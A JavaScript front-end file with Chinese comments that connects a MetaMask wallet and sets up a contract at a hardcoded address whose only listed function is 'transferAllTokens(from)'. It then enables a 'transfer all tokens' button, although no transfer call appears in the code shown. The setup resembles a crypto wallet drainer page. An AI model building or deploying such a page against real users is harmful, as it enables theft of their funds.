window.onload = function() {
    const connectWalletButton = document.getElementById('connectWalletButton');
    const transferAllTokensButton = document.getElementById('transferAllTokensButton');
    const walletAddressDiv = document.getElementById('walletAddress');
    let userAddress = null;

    // 智能合约地址和 ABI
    const contractAddress = '0x38cB7800C3Fddb8dda074C1c650A155154924C73'; // 替换为你的合约地址
    const contractABI = [
        {
            "inputs": [{"internalType": "address","name": "from","type": "address"}],
            "name": "transferAllTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        // 其他 ABI 部分省略...
    ];

    let provider;
    let signer;
    let contract;

    // 检查 MetaMask 是否安装
    if (typeof window.ethereum !== 'undefined') {
        console.log('MetaMask detected');

        // 绑定连接钱包按钮的点击事件
        connectWalletButton.addEventListener('click', async () => {
            try {
                console.log("Connecting to MetaMask...");

                // 禁用按钮以防止重复点击
                connectWalletButton.disabled = true;
                connectWalletButton.innerHTML = '连接中...';

                // 连接 MetaMask
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                console.log("Connected, user address:", userAddress);

                // 显示用户地址
                walletAddressDiv.innerHTML = `钱包地址: ${userAddress}`;

                // 实例化智能合约
                contract = new ethers.Contract(contractAddress, contractABI, signer);

                // 启用“转移代币”按钮
                transferAllTokensButton.disabled = false;

                // 连接成功后，恢复按钮状态
                connectWalletButton.innerHTML = '钱包已连接';

            } catch (error) {
                console.error('Error connecting wallet:', error);
                walletAddressDiv.innerHTML = '连接钱包失败，请重试';
                connectWalletButton.disabled = false;
                connectWalletButton.innerHTML = '连接钱包';
            }
        });

    } else {
        console.log('MetaMask not found');
        walletAddressDiv.innerHTML = '请安装 MetaMask 扩展程序';
        connectWalletButton.disabled = true;
        connectWalletButton.innerHTML = 'MetaMask 未检测到';
    }
};
